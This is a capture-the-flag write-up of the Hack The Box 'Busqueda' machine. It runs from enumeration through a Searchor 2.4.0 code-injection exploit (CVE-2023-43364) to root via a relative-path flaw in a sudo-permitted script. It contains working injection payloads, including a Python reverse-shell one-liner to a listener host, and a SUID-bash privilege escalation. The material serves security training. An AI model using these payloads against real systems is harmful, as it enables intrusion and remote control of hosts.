<p align="center">
  <img src="../assets/branding/nu11s3c-banner.svg" alt="nu11s3c">
</p>

# busqueda - hack the box

**Platform:** Hack The Box  
**OS:** Linux  
**Difficulty:** Easy  
**Outcome:** User + Root  
**Focus:** web enumeration, Python code injection, Git, credential reuse, Docker enumeration, Linux privilege escalation

---

## 00 / prep & enumeration

init environment

```sh
CPTS/day04/busqueda
❯ touch env.fish && mkdir loot logs notes scans

CPTS/day04/busqueda
❯ nano env.fish

CPTS/day04/busqueda took 27s
❯ cat env.fish
# Engagement configuration
set -gx ENGAGEMENT "busqueda"
set -gx IP "<TARGET_IP>"

# New logging destination
set -gx ENGAGEMENT_DIR (pwd -P)

# Copy to tmux session
if set -q TMUX
	set -l session (tmux display-message -p '#S')

	tmux set-environment -t "$session" ENGAGEMENT "$ENGAGEMENT"
	tmux set-environment -t "$session" IP "$IP"
	tmux set-environment -t "$session" ENGAGEMENT_DIR "$ENGAGEMENT_DIR"
end

CPTS/day04/busqueda
❯ source ./env.fish

CPTS/day04/busqueda
❯ tree
.
├── env.fish
├── logs
│   └── tmux
│       ├── s0-p0-20261114T205335-Kzry7K.log
│       └── s0-p19-20261114T205335-f3hMvx.log
├── loot
├── notes
│   └── notes.md
└── scans

6 directories, 4 files
```

The environment file contains my engagement name, target IP and working directory, and passes those variables to the tmux session

```sh
nmap -sVC -oA scans/initial $IP
```

```text
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.1
80/tcp open  http    Apache httpd 2.4.52
|_http-title: Did not follow redirect to http://searcher.htb/
```

The HTTP redirect gives me a hostname to work with

```sh
echo "$IP    searcher.htb" | sudo tee -a /etc/hosts
nmap -p- --min-rate 1000 -oA scans/allports $IP
nmap -sUV --top-ports 100 -oA scans/udp $IP
```

The full TCP scan confirms the same two ports. The UDP scan doesn't turn up anything particularly useful: port 68 is marked open|filtered

visiting the web server I found a web app called `Searchor` version `2.4.0`. web app redirects to search engines  or provides a URL to the search

![Searcher home page](../assets/images/busqueda/searcher-home.png)

## 01 / initial access

With only SSH and HTTP available, I started with the web application.

```sh
whatweb http://searcher.htb
```

```text
http://searcher.htb [200 OK] Bootstrap[4.1.3],
HTTPServer[Werkzeug/2.1.2 Python/3.10.6],
JQuery[3.2.1], Python[3.10.6], Title[Searcher],
Werkzeug[2.1.2]
```

The site was using Searchor, which led me to CVE-2023-43364, a code injection vulnerability affecting Searchor 2.4.0.

- [CVE-2023-43364](https://www.cve.org/CVERecord?id=CVE-2023-43364)
- [Searchor 2.4.0 PoC](https://github.com/nexis-nexis/Searchor-2.4.0-POC-Exploit-)

spent a fair bit of time trying to get my input to execute

initially tried manipulating the engine parameter. I eventually worked with a valid engine, AlternativeTo, and directed my test at the query parameter instead. Once I could demonstrate command execution, I moved on to obtaining a shell.

![Initial engine parameter test](../assets/images/busqueda/initial-engine-test.png)

`engine=AlternativeTo&query=')%2b__import__('os').system('id')%23`

![Command execution as svc](../assets/images/busqueda/command-execution.png)

`engine=AlternativeTo&query=')%2bexec("import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('<LHOST>',1337));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(['/bin/sh','-i'])")%23`

![Shell request](../assets/images/busqueda/shell-request.png)

```sh
svc@busqueda:/var/www/app$ id
uid=1000(svc) gid=1000(svc) groups=1000(svc)

svc@busqueda:/var/www/app$ ls /home/svc
user.txt
```

user obtained

## 03 / internal enumeration

Now that I had a shell, I started working through my Linux enumeration methodology.

```sh
id
groups
sudo -l
ls -la
ls -la /home/svc
uname -a
cat /etc/os-release
ss -tuln
```

`sudo -l` required a password, which I didn't have at this point.

the host was running Ubuntu 22.04.2 LTS, and there were several interesting ports listening on localhost that obviously didn't appear in my external scan

| Port  | Observation                                                        |
| ----- | ------------------------------------------------------------------ |
| 222   | Internal TCP listener; later identified as a container SSH mapping |
| 3000  | Gitea web application                                              |
| 3306  | MySQL                                                              |
| 5000  | Internal TCP listener                                              |
| 46865 | Internal TCP listener; not identified in my notes                  |

```sh
curl -I http://127.0.0.1:3000
curl http://127.0.0.1:3000
```

the HTML revealed Gitea 1.18.0+rc1 and a new hostname, `gitea.searcher.htb`

there was another interesting detail in the web application's directory

```sh
svc@busqueda:/var/www/app$ ls -la
total 20
drwxr-xr-x 4 www-data www-data 4096 Apr  3  2023 .
drwxr-xr-x 4 root     root     4096 Apr  4  2023 ..
-rw-r--r-- 1 www-data www-data 1124 Dec  1  2022 app.py
drwxr-xr-x 8 www-data www-data 4096 Nov 15 01:36 .git
drwxr-xr-x 2 www-data www-data 4096 Dec  1  2022 templates
```

a Git repository

```sh
svc@busqueda:/var/www/app$ cat .git/config
[remote "origin"]
    url = http://cody:[redacted]@gitea.searcher.htb/cody/Searcher_site.git
```

the remote URL contained credentials in plaintext. After finding those, I was able to enumerate the sudo permissions for `svc`

```text
User svc may run the following commands on busqueda:
    (root) /usr/bin/python3 /opt/scripts/system-checkup.py *
```

## 04 / privilege escalation enumeration

the script was owned by root and executable but not readable by my user. So I couldn't just cat the script

```sh
svc@busqueda:/var/www/app$ ls -lah /opt/scripts/system-checkup.py
-rwx--x--x 1 root root 1.9K Dec 24 2022 /opt/scripts/system-checkup.py
```

I tested its available actions. The usage output told me it could list containers, inspect containers and perform a full system checkup.

```text
Usage: /opt/scripts/system-checkup.py <action> (arg1) (arg2)

     docker-ps     : List running docker containers
     docker-inspect : Inpect a certain docker container
     full-checkup  : Run a full system checkup
```

I noticed two containers: Gitea and MySQL.

### docker inspect

 a rabbit hole, but a useful one. I didn't know much about Docker's Go template syntax and initially mistook the template evaluation for a more general code execution primitive

the templates format container metadata. For example, the name field returned `/gitea`. The configuration data was especially interesting

inspection exposed database connection variables, including a plaintext password, and a read-write bind mount from the host's Gitea data directory to the container's `/data` directory

```text
GITEA__database__DB_TYPE=mysql
GITEA__database__HOST=db:3306
GITEA__database__NAME=gitea
GITEA__database__USER=gitea
GITEA__database__PASSWD=[redacted]
```

bind mount means the container can see a directory from the host directly. That does not automatically give me root on the host, but it is useful to understand where the application's data actually resides

using the database credentials, I enumerated the Gitea database and found the administrator and cody accounts. The user table contained password hashes and salts

```text
id  name           is_admin  is_active
1   administrator  1         1
2   cody           0         1
```

### full-checkup

The other action in the Python script turned out to be the more important one.

When I originally tried full-checkup from the web application directory, I got:

```text
Something went wrong
```

running it from `/opt/scripts`, however, produced the container status, port mappings, Apache virtual hosts

that difference in behavior mattered. The script's outcome seemed to depend on the current working directory

## 05 / root

the issue was not Docker itself. It was the privileged checkup script's handling of a relative script path

created a separate `full-checkup.sh` in a writable directory and invoked the permitted checkup action from there. The resulting root-owned SUID Bash binary provided the evidence that the replacement script had been executed with elevated privileges.

![Full checkup script](../assets/images/busqueda/full-checkup.png)

```sh
svc@busqueda:~$ nano full-checkup.sh
svc@busqueda:~$ chmod +x full-checkup.sh
svc@busqueda:~$ sudo /usr/bin/python3 /opt/scripts/system-checkup.py full-checkup

[+] Done!
svc@busqueda:~$ /tmp/bash -p
```

```text
-rwsr-sr-x 1 root root 1396520 Nov 15 14:31 bash
```

```text
bash-5.1# whoami
root
```

root flag was in `/root/root.txt`

root obtained

## 06 / takeaways

biggest lesson on this box was the difference between finding something interesting and finding something that actually gets me closer to my objective

the Docker inspection exposed credentials and gave me a better understanding of the application, but the privilege escalation was a separate issue involving how a script was called. I spent quite a bit of time on the former before returning to the latter

- check Git metadata, not just the application's source code.
- compare externally visible services with local listeners after obtaining access
- understand what a template evaluates before assuming it provides arbitrary command execution
- when a privileged wrapper behaves differently depending on the working directory, investigate the dependency rather than treating the failure as random

## 07 / references

- [CVE-2023-43364](https://www.cve.org/CVERecord?id=CVE-2023-43364)
- [Searchor 2.4.0 PoC](https://github.com/nexis-nexis/Searchor-2.4.0-POC-Exploit-)

---

<sub>nu11s3c </sub>
